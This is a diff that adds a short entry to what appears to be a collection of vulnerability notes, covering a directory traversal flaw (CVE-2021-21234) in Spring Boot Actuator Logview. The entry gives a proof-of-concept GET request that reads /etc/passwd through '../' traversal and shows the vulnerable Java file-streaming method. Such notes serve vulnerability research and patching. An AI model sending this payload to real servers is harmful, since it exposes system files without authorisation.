@@ -300,3 +300,18 @@ static IStandardExpression parseExpression(IExpressionContext context, String in
     String preprocessedInput = preprocess ? StandardExpressionPreprocessor.preprocess(context, input) : input;
 }
 ```
+## Spring Boot Actuator Logview
+### CVE-2021-21234 Directory Traversal 
+Affected Version: < 0.2.13  
+POC: 
+```
+GET /manage/log/view?filename=/etc/passwd&base=../../../../../
+```
+Factor: 
+```
+eu.hinsch.spring.boot.actuator.logview.FileSystemFileProvider
+public void streamContent(Path folder, String filename, OutputStream stream) throws IOException {
+    IOUtils.copy(new FileInputStream(this.getFile(folder, filename)), stream);
+}
+```
+
